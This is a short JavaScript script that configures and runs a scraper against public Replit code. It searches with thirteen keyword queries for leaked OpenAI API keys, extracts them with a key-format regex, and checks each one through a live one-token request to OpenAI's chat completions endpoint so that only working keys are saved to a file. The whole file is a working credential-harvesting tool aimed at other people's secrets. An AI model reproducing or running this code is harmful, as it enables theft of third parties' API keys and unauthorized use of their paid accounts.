import axios from 'axios';
import { ReplitScraper } from "../dist/index.js";

const scraper = new ReplitScraper({
  output: "./output.json",
  headers: {
    'User-Agent': 'ReplitScraper/1.0.0', // optional
    'cookie': 'connect.sid=; replit_authed=1;', // Your replit auth cookie
  },
  searches: [
    { value: 'openai.api_key', first: 10000 },
    { value: 'apiKey: "sk-', first: 5000 },
    { value: 'OPENAI_API_KEY sk-', first: 10000 },
    { value: 'openai sk-', first: 10000 },
    { value: 'Authorization: Bearer sk', first: 5000 },
    { value: 'openai', first: 5000 },
    { value: 'chatgpt', first: 5000 },
    { value: 'OPENAI_API_KEY', first: 5000 },
    { value: 'openai process.env sk', first: 10000 },
    { value: 'sk AI', first: 6000 },
    { value: 'sk- openai', first: 5000 },
    { value: 'openai gpt432k sk', first: 6000 },
    { value: 'openai.organization org sk', first: 5000 },
  ],
  filter: /sk-\w{20}T3BlbkFJ\w{20}/g,
  check: async (value) => {
    try {
      await axios.post(
        'https://api.openai.com/v1/chat/completions',
        {
          'model': 'gpt-3.5-turbo',
          'max_tokens': 1,
          'messages': [
            {
              'role': 'user',
              'content': ''
            }
          ]
        },
        {
          headers: {
            'Authorization': `Bearer ${value}`,
            'Content-Type': 'application/json'
          }
        }
      );
    }
    catch (err) {
      return false;
    }

    return true;
  }
});

await scraper.Start();